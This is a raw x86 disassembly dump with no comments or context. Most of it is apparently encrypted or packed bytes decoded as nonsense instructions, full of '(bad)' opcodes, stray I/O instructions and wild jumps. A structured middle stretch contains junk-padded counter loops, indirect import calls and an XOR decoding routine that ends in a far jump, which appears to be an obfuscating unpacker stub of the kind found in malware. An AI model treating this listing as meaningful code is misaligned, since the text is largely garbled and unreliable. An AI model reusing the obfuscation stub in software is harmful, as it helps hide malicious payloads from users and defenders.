  410cb0:	fwait
  410cb1:	ds mov ah,0x29
  410cb4:	dec    eax
  410cb5:	outs   dx,DWORD PTR ds:[esi]
  410cb6:	loop   0x410c89
  410cb8:	sahf   
  410cb9:	scas   al,BYTE PTR es:[edi]
  410cba:	cmp    al,0x23
  410cbc:	rcr    BYTE PTR [ebx+0x69],1
  410cbf:	out    0xd0,eax
  410cc1:	stos   DWORD PTR es:[edi],eax
  410cc2:	dec    DWORD PTR [ecx]
  410cc4:	ret    
  410cc5:	shr    DWORD PTR ds:0xd609e243,1
  410ccb:	fisubr DWORD PTR [ebp+0x23a633fd]
  410cd1:	add    DWORD PTR [edx+0x7b],edx
  410cd4:	mov    bh,0xc6
  410cd6:	mov    ah,0xe4
  410cd8:	neg    BYTE PTR [eax-0x1199eb6c]
  410cde:	rol    BYTE PTR [ebx],0xc1
  410ce1:	int    0x1a
  410ce3:	(bad)  
  410ce4:	cli    
  410ce5:	dec    ebp
  410ce6:	mov    cl,0x5a
  410ce8:	out    dx,eax
  410ce9:	push   eax
  410cea:	cld    
  410ceb:	sub    al,0xf
  410ced:	mov    dl,0xf6
  410cef:	(bad)
  410cf3:	nop
  410cf4:	test   al,0x93
  410cf6:	pushf  
  410cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf8:	call   ebp
  410cfa:	(bad)  
  410cfb:	xchg   ebx,eax
  410cfc:	lods   al,BYTE PTR ds:[esi]
  410cfd:	mov    BYTE PTR [ecx-0x30],dl
  410d00:	dec    ecx
  410d01:	cmp    eax,0x98ece45f
  410d06:	pop    esp
  410d07:	cmp    ah,BYTE PTR [ebp-0x5ebbca23]
  410d0d:	les    edi,FWORD PTR [eax-0x52]
  410d10:	call   0xfb38:0x1422799
  410d17:	push   0x675a577c
  410d1c:	test   eax,0x434ae8b4
  410d21:	cwde   
  410d22:	sbb    DWORD PTR [edx-0x37],esi
  410d25:	push   cs
  410d26:	xor    dh,dl
  410d28:	test   eax,0x56811a8e
  410d2d:	jge    0x410d11
  410d2f:	shl    esp,cl
  410d31:	and    dl,bh
  410d33:	mov    ?,WORD PTR [esi-0x55207773]
  410d39:	jg     0x410d6c
  410d3b:	ficom  DWORD PTR [eax-0x73c4c31a]
  410d41:	jbe    0x410d5b
  410d43:	jb     0x410d2c
  410d45:	jo     0x410d26
  410d47:	pop    ecx
  410d48:	mov    cl,0xbd
  410d4a:	(bad)  
  410d4b:	stos   DWORD PTR es:[edi],eax
  410d4c:	jmp    0x410d64
  410d4e:	fcmovb st,st(0)
  410d50:	imul   esp,ebp,0x3f
  410d53:	popf   
  410d54:	sub    eax,0x93ca9619
  410d59:	ror    dh,1
  410d5b:	test   DWORD PTR [esi-0x8],edi
  410d5e:	push   0xe1d4894e
  410d63:	pop    ebp
  410d64:	pushf  
  410d65:	sub    ebp,DWORD PTR [esi+edi*4-0x5b34314a]
  410d6c:	mov    ds:0x4a812033,al
  410d71:	(bad)  
  410d72:	mov    ecx,0xd685cb37
  410d77:	addr16 adc esi,eax
  410d7a:	pop    edi
  410d7b:	imul   esi,DWORD PTR [ecx-0x69],0xf85635fc
  410d82:	iret   
  410d83:	imul   esi,edi,0x93f97e9b
  410d89:	sbb    dh,cl
  410d8b:	push   es
  410d8c:	test   eax,0x7ba91589
  410d91:	idiv   DWORD PTR [eax]
  410d93:	push   ds
  410d94:	dec    ebp
  410d95:	imul   esi,DWORD PTR [ecx+0x39eb5c25],0xffffffc6
  410d9c:	mov    ds:0xe1f66441,eax
  410da1:	fcmovne st,st(6)
  410da3:	xchg   DWORD PTR [esi+edi*8],ebx
  410da6:	xchg   BYTE PTR [esi-0x6a],ah
  410da9:	push   ebx
  410daa:	mov    ch,0xb8
  410dac:	das    
  410dad:	int    0xed
  410daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db0:	fsubr  QWORD PTR [ebx+0x2c]
  410db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410db4:	mov    bh,0x2
  410db6:	jg     0x410d66
  410db8:	out    dx,eax
  410db9:	mov    ebp,0x33726120
  410dbe:	inc    esp
  410dbf:	icebp  
  410dc0:	sbb    al,0xbe
  410dc2:	jle    0x410dfb
  410dc4:	mov    BYTE PTR [edx],cl
  410dc6:	fidivr WORD PTR [edi-0x52c14039]
  410dcc:	fnsave [edi+0x56]
  410dcf:	add    esi,0xf786402
  410dd5:	fwait
  410dd6:	dec    ecx
  410dd7:	icebp  
  410dd8:	int3   
  410dd9:	xchg   ebp,eax
  410dda:	(bad)  
  410ddb:	or     al,0x60
  410ddd:	jne    0x410df2
  410ddf:	lahf   
  410de0:	(bad)  
  410de2:	loopne 0x410daa
  410de4:	pop    ss
  410de5:	jp     0x410df8
  410de7:	dec    ecx
  410de8:	mov    ebx,0xb55f84de
  410ded:	fistp  QWORD PTR [edi+0x7b]
  410df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410df1:	(bad)  
  410df2:	mov    ecx,0x355a5062
  410df7:	out    dx,al
  410df8:	into   
  410df9:	cli    
  410dfa:	push   0xfffffff9
  410dfc:	sub    DWORD PTR [edx-0x694476eb],0xfffffff2
  410e03:	adc    eax,0x8da90245
  410e08:	test   eax,0xff7abedc
  410e0d:	sub    ecx,DWORD PTR [ecx-0x572f3126]
  410e13:	mov    al,ds:0x86e04ee
  410e18:	ja     0x410e6e
  410e1a:	sub    al,0xa0
  410e1c:	test   DWORD PTR [ebx],esp
  410e1e:	aam    0x22
  410e20:	mov    dl,0x24
  410e22:	dec    ebp
  410e23:	mov    ah,0x61
  410e25:	out    0x0,eax
  410e27:	sahf   
  410e28:	repz retf 0x40f0
  410e2c:	fst    QWORD PTR [edx]
  410e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e2f:	nop
  410e30:	cli    
  410e31:	xor    eax,0x679f812c
  410e36:	into   
  410e37:	sub    BYTE PTR [edi+0x2e3ab9fb],bl
  410e3d:	mov    ch,0xe5
  410e3f:	cld    
  410e40:	or     eax,0xc0b9fa3e
  410e45:	mov    dh,0xd9
  410e47:	cmp    DWORD PTR [ebp+0x17],eax
  410e4a:	xchg   ecx,eax
  410e4b:	fwait
  410e4c:	and    al,0x59
  410e4e:	and    BYTE PTR [edx+0x74b1d268],dh
  410e54:	adc    al,0x55
  410e56:	mov    ebx,0xbad68918
  410e5b:	jmp    0x410e3f
  410e5d:	mov    dh,0xf
  410e5f:	sub    al,0x34
  410e61:	mov    ds:0x13f8f4e9,eax
  410e66:	and    eax,0x210dd8e8
  410e6b:	pop    esp
  410e6c:	mov    ds:0x71e7af5b,eax
  410e71:	idiv   DWORD PTR [edi-0x32]
  410e74:	xchg   ebp,eax
  410e75:	(bad)
  410e7a:	(bad)  
  410e7b:	fsubr  st(6),st
  410e7d:	and    eax,0xf5bccefa
  410e82:	mov    eax,ds:0x296d9681
  410e87:	das    
  410e88:	je     0x410e20
  410e8a:	cld    
  410e8b:	mov    ?,ecx
  410e8d:	ds in  eax,dx
  410e8f:	arpl   WORD PTR [edi],cx
  410e91:	push   es
  410e92:	ins    DWORD PTR es:[edi],dx
  410e93:	sub    DWORD PTR [esp+ecx*1],esp
  410e96:	aam    0x84
  410e98:	xor    al,0xea
  410e9a:	std    
  410e9b:	sbb    eax,0x17cb3dea
  410ea0:	pusha  
  410ea1:	and    ebx,0xbdf1cace
  410ea7:	hlt    
  410ea8:	push   ds
  410ea9:	mul    DWORD PTR [edi]
  410eab:	push   eax
  410eac:	arpl   WORD PTR [eax],si
  410eae:	pop    esi
  410eaf:	cli    
  410eb0:	push   ebx
  410eb1:	mov    al,0x32
  410eb3:	lods   al,BYTE PTR es:[esi]
  410eb5:	inc    esp
  410eb6:	in     eax,0x51
  410eb8:	and    DWORD PTR [ecx-0x6719dad5],0x32
  410ebf:	jge    0x410ef6
  410ec1:	mov    dh,0xf5
  410ec3:	pop    ebx
  410ec4:	sub    eax,DWORD PTR [edx]
  410ec6:	sbb    BYTE PTR [edi+0x684b8c98],dl
  410ecc:	in     al,0xe1
  410ece:	jmp    0x3103f2a
  410ed3:	inc    DWORD PTR [esi+edi*8+0x43]
  410ed7:	pop    ebp
  410ed8:	push   cs
  410ed9:	pop    edi
  410eda:	add    DWORD PTR [ebp+0x36cad1f9],edi
  410ee0:	clc    
  410ee1:	sbb    al,0x5e
  410ee3:	jl     0x410e8f
  410ee5:	pop    ebx
  410ee6:	leave  
  410ee7:	add    al,dl
  410ee9:	pop    eax
  410eea:	mov    dl,bl
  410eec:	and    dh,BYTE PTR [ecx]
  410eee:	(bad)  
  410eef:	xchg   ebp,eax
  410ef0:	ror    bl,1
  410ef2:	and    cl,dh
  410ef4:	hlt    
  410ef5:	lods   al,BYTE PTR ds:[esi]
  410ef6:	mov    ds:0xf42e959b,al
  410efb:	push   cs
  410efc:	(bad)  
  410efd:	jnp    0x410ee7
  410eff:	out    0x7c,al
  410f01:	inc    ebp
  410f02:	jecxz  0x410ed0
  410f04:	and    BYTE PTR [ecx-0x6aaba0ca],bl
  410f0a:	mov    dh,0x1b
  410f0c:	cmp    ah,BYTE PTR [eax-0x14dcf5b4]
  410f12:	lds    esi,FWORD PTR [edi]
  410f14:	jmp    0x410ea6
  410f16:	xchg   edi,eax
  410f17:	aad    0x4c
  410f19:	pop    edx
  410f1a:	popf   
  410f1b:	into   
  410f1c:	(bad)  
  410f1d:	push   0x964a0c19
  410f22:	add    BYTE PTR [esi+0x7ffdcdbf],al
  410f28:	push   esi
  410f29:	adc    eax,0xe7b44c9f
  410f2e:	ja     0x410ef7
  410f30:	sbb    al,0xa9
  410f32:	mov    al,0x3c
  410f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f35:	mov    dh,0xe8
  410f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f38:	sbb    eax,ebx
  410f3a:	(bad)  
  410f3b:	jg     0x410f18
  410f3d:	stos   DWORD PTR es:[edi],eax
  410f3e:	std    
  410f3f:	and    al,0xfb
  410f41:	test   ch,al
  410f43:	dec    edx
  410f44:	pop    ebx
  410f45:	push   ds
  410f46:	fmul   st(0),st
  410f48:	pop    edi
  410f49:	outs   dx,BYTE PTR ds:[esi]
  410f4a:	ja     0x410f60
  410f4c:	and    DWORD PTR [eax],0x3a
  410f4f:	push   cs
  410f50:	test   DWORD PTR [edx-0xfbb1180],0x3cd22697
  410f5a:	mov    al,ds:0xc6246781
  410f5f:	and    eax,0xcbaf62b3
  410f64:	out    dx,eax
  410f65:	popf   
  410f66:	cmp    DWORD PTR [edx],0xba7acd91
  410f6c:	mov    DWORD PTR [ebx],ecx
  410f6e:	in     eax,0x2d
  410f70:	inc    ecx
  410f71:	mov    bh,0x6a
  410f73:	mov    BYTE PTR [eax+0x44],ch
  410f76:	retf   0x1307
  410f79:	xor    BYTE PTR ds:0xb80c500d,bl
  410f7f:	outs   dx,DWORD PTR ds:[esi]
  410f80:	push   ss
  410f81:	daa    
  410f82:	int3   
  410f83:	push   eax
  410f84:	cs stc 
  410f86:	jle    0x410f2d
  410f88:	lea    ebx,[eax+eax*1]
  410f8b:	sub    DWORD PTR [edx-0x7c],ebp
  410f8e:	inc    eax
  410f8f:	stc    
  410f90:	fwait
  410f91:	xor    al,0x2f
  410f93:	bound  ebp,QWORD PTR [eax]
  410f95:	mov    ah,0xf2
  410f97:	add    eax,0x28e8ba32
  410f9c:	fcomip st,st(0)
  410f9e:	or     eax,0xb4da0cb8
  410fa3:	scas   al,BYTE PTR es:[edi]
  410fa4:	ds cmp eax,0x51a608ba
  410faa:	aas    
  410fab:	cli    
  410fac:	js     0x410f51
  410fae:	ins    DWORD PTR es:[edi],dx
  410faf:	js     0x41100e
  410fb1:	and    edi,ebp
  410fb3:	dec    edi
  410fb4:	leave  
  410fb5:	push   ebp
  410fb6:	sbb    eax,esp
  410fb8:	and    al,0x2a
  410fba:	stc    
  410fbb:	add    DWORD PTR [esi+0x7f],0xffffffb4
  410fbf:	iret   
  410fc0:	xor    ecx,ecx
  410fc2:	aam    0x69
  410fc4:	scas   al,BYTE PTR es:[edi]
  410fc5:	sub    bl,BYTE PTR [ebp-0xe]
  410fc8:	mov    DWORD PTR [ecx-0x7a77ee51],edx
  410fce:	add    edi,DWORD PTR [eax+0x7f]
  410fd1:	jb     0x410fc9
  410fd3:	push   ecx
  410fd4:	in     eax,dx
  410fd5:	je     0x410fdd
  410fd7:	mov    ds:0x4e26c479,eax
  410fdc:	sub    eax,0xe8364a14
  410fe1:	sub    al,0xef
  410fe3:	add    BYTE PTR [edi+0x72],0x55
  410fe7:	jne    0x410f6f
  410fe9:	add    al,0x66
  410feb:	leave  
  410fec:	xor    edx,ebx
  410fee:	dec    edx
  410fef:	cdq    
  410ff0:	or     al,0xc
  410ff2:	das    
  410ff3:	add    BYTE PTR [ecx+0x5c],bh
  410ff6:	rol    DWORD PTR [edi+eax*4+0x4f579d3d],0x2d
  410ffe:	mov    edx,0x80fa24a1
  411003:	xor    bl,BYTE PTR [edx]
  411005:	mov    dh,0x91
  411007:	inc    edi
  411008:	inc    esp
  411009:	xlat   BYTE PTR ds:[ebx]
  41100a:	and    ebx,esp
  41100c:	daa    
  41100d:	xchg   esp,eax
  41100e:	ss int 0x1f
  411011:	adc    BYTE PTR [eax],ch
  411013:	inc    esp
  411014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411015:	sbb    ebp,0x9256f9da
  41101b:	jmp    0xb0d12288
  411020:	je     0x410fe2
  411022:	loop   0x411025
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	sub    ah,BYTE PTR [ebx]
  4115ad:	pop    ds
  4115ae:	push   eax
  4115af:	inc    eax
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	pop    ecx
  4115b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b9:	push   es
  4115ba:	mov    ecx,ebp
  4115bc:	addr16 inc esp
  4115be:	loop   0x4115aa
  4115c0:	out    dx,al
  4115c1:	pop    ss
  4115c2:	scas   eax,DWORD PTR es:[edi]
  4115c3:	inc    esi
  4115c4:	xchg   BYTE PTR [esi+eiz*2+0x2c12c81d],al
  4115cb:	jnp    0x411604
  4115cd:	mov    ebx,0xf7dce0d1
  4115d2:	jbe    0x411587
  4115d4:	push   ss
  4115d5:	addr16 push ebp
  4115d7:	sub    DWORD PTR [ebx-0x44],eax
  4115da:	or     BYTE PTR [edx-0x21],dl
  4115dd:	ins    DWORD PTR es:[edi],dx
  4115de:	dec    bh
  4115e0:	mov    ah,0x9c
  4115e2:	mov    bh,0x89
  4115e4:	loopne 0x4115a6
  4115e6:	and    eax,0x26bcbf2f
  4115eb:	xchg   edi,eax
  4115ec:	jbe    0x41157e
  4115ee:	dec    ecx
  4115ef:	and    eax,0x7d98451b
  4115f4:	pop    ecx
  4115f5:	fwait
  4115f6:	jb     0x41161f
  4115f8:	cmp    edx,eax
  4115fa:	fucomp st(2)
  4115fc:	pop    edx
  4115fd:	add    al,0x18
  4115ff:	lahf   
  411600:	scas   al,BYTE PTR es:[edi]
  411601:	test   DWORD PTR [eax+0x6740d8a1],eax
  411607:	fnstsw WORD PTR [eax]
  411609:	push   es
  41160a:	imul   ebx,esi,0xb
  41160d:	adc    ch,BYTE PTR [ecx]
  41160f:	or     ch,ah
  411611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411612:	test   DWORD PTR [esi-0x15],ebp
  411615:	mov    ecx,0x36d63b32
  41161a:	call   0xc7a320bb
  41161f:	or     al,0x7c
  411621:	sbb    ah,BYTE PTR [ebx]
  411623:	add    esi,DWORD PTR [eax+0x198ad9b1]
  411629:	rol    BYTE PTR [esi+0x5a],0xab
  41162d:	mov    eax,ds:0xcaff4136
  411632:	xchg   BYTE PTR [eax-0x7],dh
  411635:	adc    ebx,DWORD PTR [edi+0x33]
  411638:	xchg   ebx,eax
  411639:	pop    edx
  41163a:	mov    ebx,0x5e27db9b
  41163f:	add    BYTE PTR [edx-0x24ae94d8],al
  411645:	push   eax
  411646:	push   esi
  411647:	sbb    WORD PTR [ebx-0x2f0f52d5],ax
  41164e:	call   0xe968a25c
  411653:	mov    BYTE PTR [ebx+0x67],dl
  411656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411657:	jbe    0x411687
  411659:	arpl   WORD PTR [ebx-0x683d1d58],di
  41165f:	sub    edi,DWORD PTR [edi-0x7c68aff]
  411665:	mov    ch,0x6
  411667:	arpl   WORD PTR [edx],bp
  411669:	jge    0x41169e
  41166b:	in     al,0xb
  41166d:	sti    
  41166e:	or     al,0xeb
  411670:	xchg   ebp,eax
  411671:	jo     0x411638
  411673:	jp     0x41160f
  411675:	mov    ebx,0x99e0bddc
  41167a:	loopne 0x4116e6
  41167c:	rep ins DWORD PTR es:[edi],dx
  41167e:	pop    edx
  41167f:	and    al,0x54
  411681:	(bad)  
  411682:	ror    ebp,1
  411684:	out    0xef,eax
  411686:	xchg   edi,edi
  411688:	and    ch,dh
  41168a:	test   BYTE PTR [ebx],0x6e
  41168d:	push   esi
  41168e:	(bad)  
  41168f:	addr16 iret 
  411691:	jae    0x4116b9
